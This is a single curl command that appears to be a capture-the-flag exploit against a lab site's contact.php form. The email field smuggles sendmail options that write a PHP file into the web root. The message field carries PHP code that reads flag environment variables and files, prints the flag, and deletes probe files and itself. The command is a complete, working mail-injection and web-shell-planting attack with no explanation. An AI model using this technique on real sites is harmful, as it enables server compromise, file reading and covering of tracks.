curl -i -sS -X POST "https://${LAB_HOST}/contact.php" \
  --data-urlencode 'name=Lab Test' \
  --data-urlencode 'email=tester@example.invalid -OQueueDirectory=/tmp -X/var/www/html/perfumer_terminal_b37a_objective.php' \
  --data-urlencode 'subject=Website enquiry' \
  --data-urlencode "message=<?php \$v=[getenv('FLAG'),getenv('WEBVERSE_FLAG')]; foreach(['/flag','/flag.txt','/var/www/html/flag.txt','/var/www/flag.txt'] as \$p){if(is_file(\$p)){\$v[]=@file_get_contents(\$p);}} foreach(\$v as \$s){if(is_string(\$s)&&preg_match('~WEBVERSE[{][^}]+[}]~',\$s,\$m)){echo \$m[0];break;}} foreach(['perfumer_terminal_b37a_probe.php','perfumer_terminal_b37a_q1.txt','perfumer_terminal_b37a_a1.txt'] as \$n){@unlink(__DIR__.'/' . \$n);} @unlink(__FILE__); ?>"
